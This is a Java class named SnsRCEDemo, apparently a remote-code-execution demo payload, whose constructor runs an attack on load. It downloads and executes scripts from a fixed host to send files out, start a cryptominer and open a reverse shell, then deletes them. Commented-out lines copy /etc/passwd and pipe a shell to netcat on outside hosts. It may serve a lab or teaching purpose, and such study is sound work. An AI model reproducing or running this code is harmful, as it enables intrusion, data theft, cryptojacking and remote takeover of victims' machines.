import java.io.IOException;

public class SnsRCEDemo {

    public SnsRCEDemo(){
        try {
            performRemoteAttack();
        } catch (Exception e){
            e.printStackTrace();
        }

    }

    private void performRemoteAttack() throws IOException, InterruptedException {
//        Runtime.getRuntime().exec("/usr/bin/open -a Terminal").waitFor();
        String ip = "10.42.0.172";
        Runtime.getRuntime().exec("gnome-terminal ");
       // Runtime.getRuntime().exec("rm ipinfo.txt");

        //Runtime.getRuntime().exec("touch test_sns.sh").waitFor();
//        Runtime.getRuntime().exec("cp /etc/passwd ./").waitFor();
//        Runtime.getRuntime().exec("rm test_file.txt").waitFor();

        Runtime.getRuntime().exec("rm sendFileToRemoteRepo.sh");
        Runtime.getRuntime().exec("wget 192.168.43.164:5888/sendFileToRemoteRepo.sh").waitFor();
        Runtime.getRuntime().exec("chmod +x sendFileToRemoteRepo.sh 777");
        Runtime.getRuntime().exec("./sendFileToRemoteRepo.sh").waitFor();
        Runtime.getRuntime().exec("rm sendFileToRemoteRepo.sh").waitFor();

        Runtime.getRuntime().exec("rm mining.sh");
        Runtime.getRuntime().exec("wget 192.168.43.164:5888/mining.sh").waitFor();
        Runtime.getRuntime().exec("chmod +x mining.sh 777");
        Runtime.getRuntime().exec("./mining.sh").waitFor();
        Runtime.getRuntime().exec("rm mining.sh").waitFor();

        Runtime.getRuntime().exec("rm reverseShell.sh").waitFor();
        Runtime.getRuntime().exec("wget 192.168.43.164:5888/reverseShell.sh").waitFor();
        Runtime.getRuntime().exec("chmod +x reverseShell.sh 777").waitFor();
        Runtime.getRuntime().exec("./reverseShell.sh").waitFor();
        Runtime.getRuntime().exec("rm reverseShell.sh");

        //Runtime.getRuntime().exec("rm reverseShell.sh").waitFor();
        //Runtime.getRuntime().exec("ncat -e /bin/sh 192.168.43.164 87");


//        Runtime.getRuntime().exec("nc -lnvp 1337 ");
       // Runtime.getRuntime().exec("/bin/sh | nc 10.2.130.246 1256 ");
    }


}
